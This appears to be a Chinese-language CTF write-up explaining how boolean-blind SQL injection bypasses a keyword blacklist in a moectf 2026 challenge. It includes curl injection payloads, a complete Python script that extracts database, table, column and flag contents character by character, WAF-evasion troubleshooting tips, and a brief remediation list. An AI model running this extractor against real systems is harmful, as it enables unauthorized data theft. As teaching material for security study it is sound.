---
title: "moectf 2026 江洋大盗：黑名单绕过与布尔盲注"
slug: "ctf-moectf-2026-sql-blind"
date: 2026-09-02T21:44:43+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "在大量关键字被过滤的情况下，用布尔盲注逐字符还原数据。"
summary: "在大量关键字被过滤的情况下，用布尔盲注逐字符还原数据。"
tags: ["CTF", "SQL注入", "盲注"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 16
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/16.SQL注入题目.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-moectf-2026-sql-blind/workflow.svg" alt="在黑名单限制下，把问题转成真假判断，再逐字符恢复数据。" loading="lazy">
  <figcaption>图 1 · 布尔盲注提取流程。在黑名单限制下，把问题转成真假判断，再逐字符恢复数据。</figcaption>
</figure>

## 1. 题目约束

moectf 2026 江洋大盗过滤了 `union`、`sleep`、`benchmark`、报错函数、
文件读写和堆叠语句，但保留了 `SELECT`、`SUBSTR`、`ASCII`、
`information_schema`，因此可以走布尔盲注。

## 2. 手工确认

```bash
curl -sS --get --data-urlencode 'id=1 and 1=1' \
  'http://127.0.0.1:<target-port>/'
curl -sS --get --data-urlencode 'id=1 and 1=2' \
  'http://127.0.0.1:<target-port>/'
```

两次响应的可见记录数应不同。

进一步：

```bash
curl -sS --get --data-urlencode \
  'id=1 and ascii(substr((select database()),1,1))>64' \
  'http://127.0.0.1:<target-port>/'
```

## 3. 完整盲注脚本

<details>
<summary>展开完整代码：blind_sqli.py</summary>

```python
#!/usr/bin/env python3
"""Boolean-blind SQL injection extractor for an authorized CTF challenge."""

from __future__ import annotations

import argparse
import sys
import time

import requests


SESSION = requests.Session()


def query(url: str, param: str, cond: str, check: str, retries: int = 3) -> bool:
    payload = f"1 and ({cond})"
    for attempt in range(1, retries + 1):
        try:
            response = SESSION.get(
                url,
                params={param: payload},
                timeout=12,
            )
            time.sleep(0.05)
            return check in response.text
        except requests.RequestException as exc:
            print(f"[!] request failed ({attempt}/{retries}): {exc}", file=sys.stderr)
            if attempt < retries:
                time.sleep(1)
    return False


def extract(
    url: str,
    param: str,
    expr: str,
    check: str,
    max_len: int,
    label: str,
) -> str:
    output = ""
    for position in range(1, max_len + 1):
        low, high = 0, 127
        while low < high:
            middle = (low + high) // 2
            condition = (
                f"ascii(substr(({expr}),{position},1))>{middle}"
            )
            if query(url, param, condition, check):
                low = middle + 1
            else:
                high = middle
        if low <= 0:
            break
        output += chr(low)
        print(f"\r{label}{output}", end="", flush=True)
    print()
    return output


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--param", default="id")
    parser.add_argument(
        "--check",
        required=True,
        help="Text present only when the SQL condition is true.",
    )
    parser.add_argument("--max-len", type=int, default=256)
    parser.add_argument("--cookie", default="")
    args = parser.parse_args()

    if args.cookie:
        SESSION.headers["Cookie"] = args.cookie

    database = extract(
        args.url,
        args.param,
        "select database()",
        args.check,
        64,
        "database: ",
    )
    print(f"[+] database={database}")

    tables = extract(
        args.url,
        args.param,
        "select group_concat(table_name) from information_schema.tables "
        "where table_schema=database()",
        args.check,
        args.max_len,
        "tables: ",
    )
    print(f"[+] tables={tables}")

    table_name = "flag_table"
    columns = extract(
        args.url,
        args.param,
        "select group_concat(column_name) from information_schema.columns "
        f"where table_schema=database() and table_name='{table_name}'",
        args.check,
        args.max_len,
        "columns: ",
    )
    print(f"[+] columns={columns}")

    candidates = [item.strip() for item in columns.split(",") if item.strip()]
    if not candidates:
        print("[-] no columns extracted", file=sys.stderr)
        return 1
    target_column = next(
        (item for item in candidates if item.lower() not in {"id"}),
        candidates[0],
    )
    print(f"[*] using column={target_column}")

    value = extract(
        args.url,
        args.param,
        f"select {target_column} from {table_name} limit 0,1",
        args.check,
        args.max_len,
        "value: ",
    )
    print(f"[+] value={value}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

</details>

下载：[blind_sqli.py](/code/ctf-moectf-2026-sql-blind/blind_sqli.py)


依赖：

```bash
python3 -m pip install requests
```

## 4. 运行

```bash
python3 blind_sqli.py \
  --url 'http://127.0.0.1:<target-port>/' \
  --param id \
  --check 'result-table'
```

把 `--check` 改成“条件为真时才会出现的页面字符串”，例如：

```text
result-table
查询成功
rows=1
```

脚本会依次提取：

```text
数据库名
表名列表
flag_table 字段
第一行 flag
```

## 5. 脚本原理

1. 构造 `1 and (ascii(substr((表达式),pos,1))>mid)`；
2. 根据 `CHECK_STRING` 判断真假；
3. 对 ASCII 0–127 做二分；
4. 逐位拼接，直到位置返回 0；
5. 表名/字段名通过 `group_concat` 合并，再按逗号拆分。

## 6. 适配原题

| 变量 | 原题值 |
| --- | --- |
| URL | 题目查询接口 |
| param | 真实参数名，可能是 `id` |
| check | 记录出现时独有的 HTML 片段 |
| 表名 | 从 `tables` 输出中选实际 flag 表 |
| 字段 | 从 `columns` 输出中选实际 flag 列 |

如果 `flag_table` 不是实际表名，修改脚本里的 `table_name`，
或者先只运行数据库名和表名提取。

## 7. 排错

| 现象 | 原因 |
| --- | --- |
| 所有条件都 False | `check` 字符串不对 |
| 所有条件都 True | 页面永远返回同一段文本 |
| 第一个字符就不对 | 参数是字符型，需要调整闭合/括号 |
| 表名被截断 | `group_concat` 长度限制，改逐表/逐列 |
| 被 WAF 拦 | 只替换等价函数，不要无限堆编码 |

## 8. 修复

- 预处理语句；
- 参数类型校验；
- 不返回数据库错误和记录数量差异；
- 对高频、相似请求做限流；
- 数据库账号最小权限。
